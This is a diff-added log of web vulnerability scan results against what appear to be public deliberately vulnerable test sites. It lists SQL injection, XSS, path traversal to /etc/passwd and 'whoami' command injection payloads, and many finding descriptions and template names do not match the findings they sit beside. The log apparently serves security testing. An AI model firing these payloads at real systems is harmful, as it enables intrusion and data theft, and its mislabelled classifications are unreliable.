+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/error.php?debug=true
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/admin/dashboard.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<script>alert('xss')</script>
+  Payload: <script>alert('xss')</script>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')</script>'' at line 1
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<img+src=x+onerror=alert('xss')>
+  Payload: <img+src=x+onerror=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/transfer_funds.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/manage_users.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+
+Timestamp: 2025-05-24 13:19:20
+Target: http://demo.testfire.net
+Template: lfi-rce-detection.yaml
+No vulnerabilities found.
+
+Timestamp: 2025-05-28 14:11:13
+Target: http://testphp.vulnweb.com/
+Template: lfi-rce-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/index.php?file=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?file=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+
+Timestamp: 2025-05-28 14:11:15
+Target: http://demo.testfire.net
+Template: xss-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://demo.testfire.net/admin
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://demo.testfire.net/update_profile.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://demo.testfire.net/profile.php?user_id=215
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://demo.testfire.net/account_details.php?account_id=181
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://demo.testfire.net/api/user_info
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://demo.testfire.net/transfer_funds.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://demo.testfire.net/admin/dashboard.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://demo.testfire.net/error.php?debug=true
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://demo.testfire.net/manage_users.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+
+Timestamp: 2025-05-28 14:21:13
+Target: http://testphp.vulnweb.com/
+Template: lfi-rce-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?file=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?file=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+
+Timestamp: 2025-05-28 14:27:58
+Target: http://testphp.vulnweb.com
+Template: xss-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/update_profile.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/admin
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/api/user_info
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/index.php?file=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/profile.php?user_id=548
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/account_details.php?account_id=695
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<img+src=x+onerror=alert('xss')>
+  Payload: <img+src=x+onerror=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<script>alert('xss')</script>
+  Payload: <script>alert('xss')</script>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')</script>'' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<svg+onload=alert('xss')>
+  Payload: <svg+onload=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/index.php?file=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/admin/dashboard.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/transfer_funds.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/manage_users.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/error.php?debug=true
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+
+Timestamp: 2025-05-28 14:31:20
+Target: http://testphp.vulnweb.com
+Template: xss-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/update_profile.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<script>alert('xss')</script>
+  Payload: <script>alert('xss')</script>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')</script>'' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/api/user_info
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/admin
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/profile.php?user_id=432
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<img+src=x+onerror=alert('xss')>
+  Payload: <img+src=x+onerror=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/index.php?file=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<svg+onload=alert('xss')>
+  Payload: <svg+onload=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/account_details.php?account_id=22
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/index.php?file=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
